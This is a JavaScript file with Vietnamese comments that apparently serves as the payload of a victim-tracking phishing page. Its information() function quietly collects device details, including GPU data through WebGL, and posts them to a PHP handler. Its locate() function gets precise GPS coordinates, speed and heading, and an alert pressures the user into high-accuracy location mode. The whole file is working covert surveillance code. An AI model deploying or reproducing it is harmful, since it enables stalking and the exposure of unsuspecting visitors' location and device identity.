function information() {
  try {
    const platform = navigator.platform || 'Không Có Sẵn';
    const concurrency = navigator.hardwareConcurrency || 'Không Có Sẵn';
    const ram = navigator.deviceMemory || 'Không Có Sẵn';
    const userAgent = navigator.userAgent || '';
    const screenHeight = window.screen.height;
    const screenWidth = window.screen.width;

    // Xác định trình duyệt
    let browser = 'Không Có Sẵn';
    if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
    else if (userAgent.includes('Chrome') && !userAgent.includes('Edg') && !userAgent.includes('OPR')) browser = 'Google Chrome';
    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Apple Safari';
    else if (userAgent.includes('Edg')) browser = 'Microsoft Edge';
    else if (userAgent.includes('OPR') || userAgent.includes('Opera')) browser = 'Opera';

    // Xác định hệ điều hành
    let os = 'Không Có Sẵn';
    try {
      const osInfo = userAgent.substring(userAgent.indexOf('(') + 1, userAgent.indexOf(')')).split(';');
      os = osInfo[1]?.trim() || os;
    } catch (_) {}

    // Lấy thông tin GPU
    let vendor = 'Không Có Sẵn';
    let renderer = 'Không Có Sẵn';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || vendor;
          renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || renderer;
        }
      }
    } catch (_) {}

    // Gửi thông tin về server
    $.ajax({
      type: 'POST',
      url: 'info_handler.php',
      data: {
        Ptf: platform,
        Brw: browser,
        Cc: concurrency,
        Ram: ram,
        Ven: vendor,
        Ren: renderer,
        Ht: screenHeight,
        Wd: screenWidth,
        Os: os
      },
      mimeType: 'text'
    });
  } catch (e) {
    console.error('Lỗi khi thu thập thông tin thiết bị:', e);
  }
}

function locate(callback, errCallback) {
  try {
    if ($('#change').length) {
      $('#change').html('<span>Đang Xác Định...</span>');
    }

    if (!navigator.geolocation) {
      if (typeof errCallback === 'function') errCallback();
      return;
    }

    const options = {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(showPosition, showError, options);

    function showPosition(position) {
      const coords = position.coords;

      const lat = coords.latitude ? coords.latitude + ' deg' : 'Không Có Sẵn';
      const lon = coords.longitude ? coords.longitude + ' deg' : 'Không Có Sẵn';
      const acc = coords.accuracy ? coords.accuracy + ' m' : 'Không Có Sẵn';
      const alt = coords.altitude != null ? coords.altitude + ' m' : 'Không Có Sẵn';
      const dir = coords.heading != null ? coords.heading + ' deg' : 'Không Có Sẵn';
      const spd = coords.speed != null ? coords.speed + ' m/s' : 'Không Có Sẵn';

      $.ajax({
        type: 'POST',
        url: 'result_handler.php',
        data: {
          Status: 'success',
          Lat: lat,
          Lon: lon,
          Acc: acc,
          Alt: alt,
          Dir: dir,
          Spd: spd
        },
        success: callback,
        mimeType: 'text'
      });
    }

    function showError(error) {
      let errText = 'Đã xảy ra lỗi không xác định';

      switch (error.code) {
        case error.PERMISSION_DENIED:
          errText = 'Người dùng từ chối yêu cầu Định vị';
          break;
        case error.POSITION_UNAVAILABLE:
          errText = 'Thông tin vị trí không khả dụng';
          break;
        case error.TIMEOUT:
          errText = 'Yêu cầu lấy vị trí người dùng đã hết thời gian';
          alert('Vui lòng đặt chế độ vị trí của bạn ở độ chính xác cao...');
          break;
      }

      $.ajax({
        type: 'POST',
        url: 'error_handler.php',
        data: {
          Status: 'failed',
          Error: errText
        },
        success: function () {
          if (typeof errCallback === 'function') {
            errCallback(error, errText);
          }
        },
        mimeType: 'text'
      });
    }
  } catch (e) {
    console.error('Lỗi định vị:', e);
    if (typeof errCallback === 'function') errCallback(e, 'Lỗi không xác định trong quá trình định vị');
  }
}
